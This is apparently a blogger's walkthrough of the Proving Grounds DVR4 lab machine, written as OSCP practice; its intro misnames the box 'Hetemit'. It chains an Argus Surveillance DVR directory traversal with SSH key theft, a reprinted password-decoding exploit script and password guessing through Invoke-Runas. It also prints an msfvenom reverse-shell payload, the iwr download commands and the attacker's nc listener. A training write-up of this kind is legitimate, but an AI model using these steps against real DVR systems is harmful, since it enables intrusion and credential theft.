+++
title = "OSCP Practise - Proving Grounds: DVR4 - Walkthrough"
author = ["Leo Oliver"]
date = 2023-09-03
tags = ["OSCP", "windows"]
categories = ["walkthrough"]
draft = false
+++

## OffSec Proving Grounds: DVR4 - Walkthrough {#offsec-proving-grounds-dvr4-walkthrough}

This post contains rough notes explaining my process for exploiting the Hetemit Proving Grounds box while preparing for the OSCP certification.


### My Process {#my-process}

Firstly I performed a port scan with nmap:

{{< bash-collapse >}}
sudo nmap -p- -T4 -A -sS -v --open -oA nmap 192.168.236.179
(o)Nmap scan report for 192.168.236.179
(o)Host is up (0.21s latency).
(o)Not shown: 65533 filtered tcp ports (no-response)
(o)Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
(o)PORT     STATE SERVICE    VERSION
(o)22/tcp   open  ssh        Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
(o)| ssh-hostkey:
(o)|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
(o)|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
(o)8080/tcp open  http-proxy
(o)|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
(o)| http-methods:
(o)|_  Supported Methods: GET HEAD POST OPTIONS
(o)|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
(o)|_http-title: Argus Surveillance DVR
(o)| fingerprint-strings:
(o)|   GetRequest, HTTPOptions:
(o)|     HTTP/1.1 200 OK
(o)|     Connection: Keep-Alive
(o)|     Keep-Alive: timeout=15, max=4
(o)|     Content-Type: text/html
(o)|     Content-Length: 985
(o)|     <HTML>
(o)|     <HEAD>
(o)|     <TITLE>
(o)|     Argus Surveillance DVR
(o)|     </TITLE>
(o)|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
(o)|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
(o)|     <frameset frameborder="no" border="0" rows="75,*,88">
(o)|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">
(o)|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
(o)|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">
(o)|     <noframes>
(o)|     <p>This page uses frames, but your browser doesn't support them.</p>
(o)|_    </noframes>
(o)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
(o)SF-Port8080-TCP:V=7.94%I=7%D=9/3%Time=64F418A3%P=x86_64-pc-linux-gnu%r(Get
(o)SF:Request,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKee
(o)SF:p-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nConte
(o)SF:nt-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Survei
(o)SF:llance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\x
(o)SF:20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GENE
(o)SF:RATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft\
(o)SF:.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20b
(o)SF:order=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x20
(o)SF:frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTop
(o)SF:Frame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\x
(o)SF:20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrolling
(o)SF:=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"0
(o)SF:\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x2
(o)SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasBo
(o)SF:ttomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r
(o)SF:\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fram
(o)SF:es,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\x
(o)SF:20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nConn
(o)SF:ection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent
(o)SF:-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r
(o)SF:\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20h
(o)SF:ttp-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859-
(o)SF:1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x206
(o)SF:\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<framese
(o)SF:t\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x
(o)SF:20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20
(o)SF:noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20margi
(o)SF:nheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20fr
(o)SF:ameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFram
(o)SF:e\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame
(o)SF:\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
(o)SF:0noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20m
(o)SF:arginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>
(o)SF:This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x2
(o)SF:0support\x20them\.</p>\r\n\x20\x20</noframes>\r");
(o)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
(o)Device type: general purpose
(o)Running (JUST GUESSING): Microsoft Windows XP (89%)
(o)OS CPE: cpe:/o:microsoft:windows_xp::sp3
(o)Aggressive OS guesses: Microsoft Windows XP SP3 (89%)
(o)No exact OS matches for host (test conditions non-ideal).
(o)Network Distance: 4 hops
(o)TCP Sequence Prediction: Difficulty=263 (Good luck!)
(o)IP ID Sequence Generation: Incremental
(o)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
(o)
(o)TRACEROUTE (using port 8080/tcp)
(o)HOP RTT       ADDRESS
(o)1   204.71 ms 192.168.45.1
(o)2   204.66 ms 192.168.45.254
(o)3   206.66 ms 192.168.251.1
(o)4   207.00 ms 192.168.236.179
(o)
(o)Read data files from: /usr/bin/../share/nmap
(o)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
(o)# Nmap done at Sun Sep  3 17:25:53 2023 -- 1 IP address (1 host up) scanned in 279.63 seconds
{{< /bash-collapse >}}

I browsed to port 8080 in my browser:
![](/ox-hugo/2023-09-03_17-25-13_screenshot.png)

I browsed the web app, and found that the users page showed there were users called Administrator and viewer.
![](/ox-hugo/2023-09-03_18-07-27_screenshot.png)

I did some research on `Argus Surveillance` and found multiple exploits on exploitdb.
The first interesting one was the directory traversal vulnerability discussed in this file [here](https://www.exploit-db.com/exploits/45296) as it is an unauthenticated exploit.
Another intersting exploit was this one [here](https://www.exploit-db.com/exploits/50130) which decodes the weak encoding that `Argus Surveillance` uses to encode users passwords. This exploit states that the `Argus Surveillance` passwords are stored in the location: `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`

An idea I had was to chain these two exploits together, and use the directory traversal to read the `Argus Surveillance` encoded passwords and then the other exploit to decode them.

So I first tested if the directory traversal shown in the exploit worked and it did. I then used the directory traversal to read the configuration file:
![](/ox-hugo/2023-09-03_18-06-20_screenshot.png)

But unfortunately there were no passwords shown there.

The machine had the ssh port open so I then tried to access users ssh keys. For the users I tried using the users I found earlier while browsing the web app. When testing for the viewer user I got access to that users ssh key:
![](/ox-hugo/2023-09-03_18-08-06_screenshot.png)

I then saved the key to a file and used the `chmod 600` command to give it the right permissions to use with ssh.
I tried to connect with ssh but couldnt connect due to tmux's custom `$TERM` environment variable not being recognised by the remote machine. So I simply overwrote the environment variable with `xterm-256color` and then I could connect.

{{< bash-code >}}
ssh viewer@192.168.202.179 -i viewer.ssh
(o)Terminal initialization failure. See server logs for more info.
(o)Hint: Try requesting a different terminal environment.
(o)Connection to 192.168.202.179 closed.
(o)
TERM=xterm-256color
(o)
ssh viewer@192.168.202.179 -i viewer.ssh
(o)Microsoft Windows [Version 10.0.19042.1348]
(o)(c) Microsoft Corporation. All rights reserved.
(o)
C:\Users\viewer>
{{< /bash-code >}}

The viewer user had the `SeShutdownPrivilege` permission which I noted, as it would be useful if I found a service to exploit.

{{< bash-code >}}
C:\Users\viewer>whoami /priv
(o)
(o)PRIVILEGES INFORMATION
(o)----------------------
(o)
(o)Privilege Name                Description                          State
(o)============================= ==================================== =======
(o)SeShutdownPrivilege           Shut down the system                 Enabled
(o)SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
(o)SeUndockPrivilege             Remove computer from docking station Enabled
(o)SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
(o)SeTimeZonePrivilege           Change the time zone                 Enabled
{{< /bash-code >}}

When I had been searching for exploits on `Argus Surveillance` at the initial enumeration phase I saw the exploit [here](https://www.exploit-db.com/exploits/50261) which says that the `Argus Surveillance DVR Watchdog` service at location `C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe` has an unquoted service path.

So then I checked to see if I had write permissions in `C:\` or `C:\Program Files`.

{{< bash-code >}}
PS C:\Program Files> icacls C:\
(o)C:\ BUILTIN\Administrators:(OI)(CI)(F)
(o)    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
(o)    BUILTIN\Users:(OI)(CI)(RX)
(o)    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
(o)    NT AUTHORITY\Authenticated Users:(AD)
(o)    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
(o)
(o)Successfully processed 1 files; Failed processing 0 files
PS C:\Program Files> icacls C:\"Program Files"
(o)C:\Program Files NT SERVICE\TrustedInstaller:(F)
(o)                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
(o)                 NT AUTHORITY\SYSTEM:(M)
(o)                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
(o)                 BUILTIN\Administrators:(M)
(o)                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
(o)                 BUILTIN\Users:(RX)
(o)                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
(o)                 CREATOR OWNER:(OI)(CI)(IO)(F)
(o)                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
(o)                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
(o)                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
(o)                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
(o)
(o)Successfully processed 1 files; Failed processing 0 files
{{< /bash-code >}}

Unfortunately I didnt so exploiting this wasnt going to work.

There is another exploit on exploit db [here](https://www.exploit-db.com/exploits/45312) that requires creating a DLL and putting it in the service directory but again this would require write permissions in the service directory which I did not have.

I then did more enumeration of the file system and returned to the `C:\ProgramData\PY_Software\Argus Surveillance DVR` directory to check out the `DVRParams.ini` configuration file:

{{< bash-collapse >}}
C:\ProgramData\PY_Software\Argus Surveillance DVR>type DVRParams.ini
(o)[Main]
(o)ServerName=
(o)ServerLocation=
(o)ServerDescription=
(o)ReadH=0
(o)UseDialUp=0
(o)DialUpConName=
(o)DialUpDisconnectWhenDone=0
(o)DialUpUseDefaults=1
(o)DialUpUserName=
(o)DialUpPassword=
(o)DialUpDomain=
(o)DialUpPhone=
(o)ConnectCameraAtStartup=1
(o)ConnectSessionFile=Argus Surveillance DVR.DVRSes
(o)StartAsService=1
(o)RunPreviewAtStartup=1
(o)FullScreenAtStartup=0
(o)GalleryFolder=C:\ProgramData\PY_Software\Argus Surveillance DVR\Gallery\
(o)RecordEncryptionPassword=
(o)RecordFrameInterval=200
(o)RecordMaxFileSize=0
(o)RecordEncryption=0
(o)RecordAllTime=0
(o)RecordSound=1
(o)RecordMotion=1
(o)RecordCamName=1
(o)RecordCamLocation=1
(o)RecordCamDescript=1
(o)HTTP_AlwaysActive=1
(o)HTTP_Port=8080
(o)HTTP_Interval=100
(o)HTTP_LimitViewers=0
(o)HTTP_NeedAuthorization=0
(o)HTTP_NeedLocalAuthorization=0
(o)HTTP_MaxNumberOfViewers=100
(o)HTTP_AudioEnabled=1
(o)HTTP_StreamEnabled=1
(o)HTTP_EncriptionType=0
(o)HTTP_VideoBitRate=204800
(o)HTTP_DisconnectInactiveUsers=0
(o)HTTP_MaxInactivityTime=0
(o)HTTP_MaxConnectionMinutes=0
(o)HTTP_ReconnectAgain=0
(o)WriteHTTPLog=1
(o)WriteMotionLog=1
(o)WriteEventsLog=1
(o)LimitMaxSizeOfLogFile=1
(o)MaxSizeOfLogFile=10000
(o)UseRedirect=1
(o)UseWebMonitoring=0
(o)PYSoftAccountEmail=
(o)PYSoftAccountPsw=
(o)AskLoginAtStartup=0
(o)TaskTrayPassword=
(o)StealthMode=0
(o)AskForConfirmationOnExit=0
(o)Watchdog_PollingIntrvl=20
(o)Watchdog_RestartProgramPolls=20
(o)Watchdog_Reboot=0
(o)Watchdog_RebootTries=20
(o)Watchdog_RebootPeriodically=1
(o)Watchdog_RebootPeriodclType=1
(o)Watchdog_RebootInterval=1
(o)Watchdog_Hours=24
(o)Watchdog_Days=1
(o)Watchdog_DayOfWeek=0
(o)Watchdog_Month=1
(o)Watchdog_RebootIfCPU=0
(o)Watchdog_RebootIfCPUType=0
(o)Watchdog_CPU=98
(o)Watchdog_RebootIfCPUPolls=20
(o)Watchdog_IsRemoteAccess=0
(o)Watchdog_AccessPort=10000
(o)Watchdog_AccessID=
(o)Watchdog_AccessPsw=
(o)DynIPNextConnectTime0=0
(o)DynIPNextConnectTime1=0
(o)MonitorNextConnectTime0=0
(o)MonitorNextConnectTime1=0
(o)SMSNextConnectTime0=0
(o)SMSNextConnectTime1=0
(o)UseScreenSaver=0
(o)ScreenSaveTimeOut=5
(o)MaxFileSize=2048
(o)StreamToWeb=0
(o)WebPageBackColor=16767949
(o)WebPageTextColor=0
(o)WebPageLinkColor=0
(o)WebPageActiveLnkColor=0
(o)WebPageVisitedLnkColor=0
(o)WebPageActiveXColor=0
(o)PreviewByOCX=1
(o)ReduceCPUUsage=1
(o)MaximumCPUUsage=95
(o)ActionsAllTime=0
(o)DetectMotion=0
(o)DetectionInterval=500
(o)MotionDetectionDelay=1000
(o)DifferencesThreshold=5
(o)MotionDifSensitivity=0
(o)MotionDontTriggerIfMuch=0
(o)MotionDontTriggerTrshld=90
(o)MotionSensitivityCnst=90
(o)MotionSensitivity1=30
(o)MotionSensitivity2=21
(o)MotionSensitivity3=17
(o)MotionSensitivity4=15
(o)MotionSensitivity5=15
(o)MotionSensitivity6=17
(o)MotionSensitivity7=21
(o)MotionSensitivity8=30
(o)MotionMinActionDuration=2000
(o)MotionSendEmail=0
(o)EmailUsePysoftMailServer=0
(o)MotionEmailServer=
(o)MotionEmailNeedPassword=0
(o)MotionEmailAccountName=
(o)MotionEmailPassword=
(o)MotionEmailSMTPPort=25
(o)MotionEmailSender=
(o)MotionEmailAddress=
(o)MotionEmailSubject=4D6F74696F6E207B4D4F54494F4E7D2520686173206265656E206465746563746564212121
(o)MotionEmailMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E2074686520776
(o)1746368656420617265612E
(o)MotionEmailInterval=20
(o)MotionEmailAttachImage=1
(o)MotionEmailNumberOfImages=3
(o)MotionEmailPriority=1
(o)FacesDetect=0
(o)FacesHighlight=1
(o)FaceDetectSensitivityInPercents=50
(o)FaceDetecMinFaceInPercents=10
(o)MotionPlaySound=0
(o)MotionSoundFile=
(o)MotionLanchApplication=0
(o)MotionApplicationFile=
(o)MotionRecordVideo=0
(o)MotionVideoDuration=120
(o)MotionPreVideoDuration=2
(o)MotionWriteSnapshots=0
(o)MotionSnapshotDuration=10
(o)MotionChangeSettings=0
(o)MotionImageQuality=70
(o)MotionSoundQuality=70
(o)MotionRecordInterval=133
(o)MotionChangeSettingsDuration=10
(o)MotionDrawMotionValue=0
(o)MotionHighlightMoving=0
(o)SendSMS=0
(o)SMSSender=
(o)SMSPhone=
(o)SMSMessage=43616D65726120237B43414D4552417D206174207B68683A6E6E3A73737D20686173206465746563746564207B4D4F54494F4E7D25206D6F74696F6E20696E207468652077617463686
(o)56420617265612E
(o)RemoveObsoleteFiles=1
(o)DaysToDeleteObsoleteFiles=7
(o)LastReadNetCamsListDay=45173
(o)
(o)[Users]
(o)LocalUsersCount=2
(o)UserID0=434499
(o)LoginName0=Administrator
(o)FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF641
(o)4D7BB740CA79F6419083
(o)FullControl0=1
(o)CanClose0=1
(o)CanPlayback0=1
(o)CanPTZ0=1
(o)CanRecord0=1
(o)CanConnect0=1
(o)CanReceiveAlerts0=1
(o)CanViewLogs0=1
(o)CanViewCamerasNumber0=0
(o)CannotBeRemoved0=1
(o)MaxConnectionTimeInMins0=0
(o)DailyTimeLimitInMins0=0
(o)MonthlyTimeLimitInMins0=0
(o)DailyTrafficLimitInKB0=0
(o)MonthlyTrafficLimitInKB0=0
(o)MaxStreams0=0
(o)MaxViewers0=0
(o)MaximumBitrateInKb0=0
(o)AccessFromIPsOnly0=
(o)AccessRestrictedForIPs0=
(o)MaxBytesSent0=0
(o)Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
(o)Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF
(o)6414D7BB740CA79F6419083
(o)Disabled0=0
(o)ExpirationDate0=0
(o)Organization0=
(o)OrganizationUnit0=
(o)Phone10=
(o)Phone20=
(o)Fax0=
(o)Email0=
(o)Position0=
(o)Address10=
(o)Address20=
(o)City0=
(o)StateProvince0=
(o)ZipPostalCode0=
(o)Country0=
(o)ComputerID0=
(o)TrialAccount0=0
(o)UserID1=576846
(o)LoginName1=Viewer
(o)FullName1=
(o)FullControl1=1
(o)CanClose1=1
(o)CanPlayback1=1
(o)CanPTZ1=1
(o)CanRecord1=1
(o)CanConnect1=1
(o)CanReceiveAlerts1=1
(o)CanViewLogs1=1
(o)CanViewCamerasNumber1=0
(o)CannotBeRemoved1=0
(o)MaxConnectionTimeInMins1=0
(o)DailyTimeLimitInMins1=0
(o)MonthlyTimeLimitInMins1=0
(o)DailyTrafficLimitInKB1=0
(o)MonthlyTrafficLimitInKB1=0
(o)MaxStreams1=0
(o)MaxViewers1=0
(o)MaximumBitrateInKb1=0
(o)AccessFromIPsOnly1=
(o)AccessRestrictedForIPs1=
(o)MaxBytesSent1=0
(o)Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
(o)Description1=
(o)Disabled1=0
(o)ExpirationDate1=0
(o)Organization1=
(o)OrganizationUnit1=
(o)Phone11=
(o)Phone21=
(o)Fax1=
(o)Email1=
(o)Position1=
(o)Address11=
(o)Address21=
(o)City1=
(o)StateProvince1=
(o)ZipPostalCode1=
(o)Country1=
(o)ComputerID1=
(o)TrialAccount1=0
{{< /bash-collapse >}}

This file had lots more information in it than when I accessed it from the directory traversal vulnerability, which I have no idea why didnt show up back then.

From the file I gathered the encoded passwords from the Administrator and viewer users:
`Administrator: Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8`
`Viewer: Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE`

Below is the python script from the exploit from exploitdb that decodes the encoded passwords. I made a minor change to make the password get printed out on a single line.

{{< highlight python >}}
# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Date: 12.07.2021
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10
# Reference: https://deathflash1411.github.io/blog/dvr4-hash-crack

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

# I'm too lazy to add special characters :P
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z','!':'B398'}

# ASCII art is important xD
banner = '''
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
'''
print(banner)

# Change this :)
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
if (len(pass_hash)%4) != 0:
	print("[!] Error, check your password hash")
	exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
	split.append(pass_hash[index : index + n])

for key in split:
	if key in characters.keys():
		print(characters[key], end="")
	else:
		print("[-] " + key + ":Unknown")
{{< /highlight >}}

Using it to decode both of the passwords:

{{< bash-code >}}
(o)python3 50130.py
(o)
(o)#########################################
(o)#    _____ Surveillance DVR 4.0         #
(o)#   /  _  \_______  ____  __ __  ______ #
(o)#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
(o)# /    |    \  | \/ /_/  >  |  /\___ \  #
(o)# \____|__  /__|  \___  /|____//____  > #
(o)#         \/     /_____/            \/  #
(o)#        Weak Password Encryption       #
(o)############ @deathflash1411 ############
(o)
(o)14WatchD0g[-] D9A8:Unknown
python3 50130.py
(o)
(o)#########################################
(o)#    _____ Surveillance DVR 4.0         #
(o)#   /  _  \_______  ____  __ __  ______ #
(o)#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
(o)# /    |    \  | \/ /_/  >  |  /\___ \  #
(o)# \____|__  /__|  \___  /|____//____  > #
(o)#         \/     /_____/            \/  #
(o)#        Weak Password Encryption       #
(o)############ @deathflash1411 ############
(o)
(o)ImWatchingY0u
{{< /bash-code >}}

The last char of the Administrator password could not be converted by the python script. So I checked the python script to see what characters it was missing from its dictionary mapping. The script was missing all symbols other than `!`, so it must be one of them that is the last char in the Administrator password.

I then transfered the `Invoke-Runas.ps1` [script](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1) to the windows machine and dot sourced it.

{{< bash-code >}}
PS C:\Users\viewer> iwr -uri http://192.168.45.229/Invoke-Runas.ps1 -outfile Invoke-Runas.ps1
PS C:\Users\viewer> . .\Invoke-Runas.ps1
{{< /bash-code >}}

I created a `msfvenom` windows exe reverse shell binary and transferred it to the windows machine:

{{< bash-code >}}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.229 LPORT=80 -f exe -o met80.exe
(o)[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
(o)[-] No arch selected, selecting arch: x86 from the payload
(o)No encoder specified, outputting raw payload
(o)Payload size: 324 bytes
(o)Final size of exe file: 73802 bytes
(o)Saved as: met80.exe
{{< /bash-code >}}

{{< bash-code >}}
PS C:\Users\viewer> iwr -uri http://192.168.45.229/met80.exe -outfile met80.exe
{{< /bash-code >}}

Finally I used the `Invoke-Runas.ps1` script to execute the `msfvenom` reverse shell binary as the Administrator user. Since I did not know the last character of the password but new it must be a symbol, I iterated over the symbol chars.

{{< bash-code >}}
PS C:\Users\viewer> Invoke-Runas -User Administrator -Password 14WatchD0g@  -Binary C:\Users\viewer\met80.exe -LogonType 0x1
(o)
(o)[>] Calling Advapi32::CreateProcessWithLogonW
(o)
(o)[!] Mmm, something went wrong! GetLastError returned:
(o)==> The system could not find the environment option that was entered
(o)
PS C:\Users\viewer> Invoke-Runas -User Administrator -Password 14WatchD0g#  -Binary C:\Users\viewer\met80.exe -LogonType 0x1
(o)
(o)[>] Calling Advapi32::CreateProcessWithLogonW
(o)
(o)[!] Mmm, something went wrong! GetLastError returned:
(o)==> The system could not find the environment option that was entered
(o)
PS C:\Users\viewer> Invoke-Runas -User Administrator -Password 14WatchD0g$  -Binary C:\Users\viewer\met80.exe -LogonType 0x1
(o)
(o)[>] Calling Advapi32::CreateProcessWithLogonW
(o)
(o)[+] Success, process details:
(o)
(o)Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
(o)-------  ------    -----      -----     ------     --  -- -----------
(o)     34       3      528       2480       0.00   3816   0 met80
{{< /bash-code >}}

The password with `$` at the end worked and the binary was executed.

I then received a shell on my nc listener as the Administrator user:

{{< bash-code >}}
rlwrap nc -nlvp 80
(o)listening on [any] 80 ...
(o)connect to [192.168.45.229] from (UNKNOWN) [192.168.202.179] 50493
(o)Microsoft Windows [Version 10.0.19042.1348]
(o)(c) Microsoft Corporation. All rights reserved.
(o)
C:\Users\viewer>whoami
(o)whoami
(o)dvr4\administrator
{{< /bash-code >}}
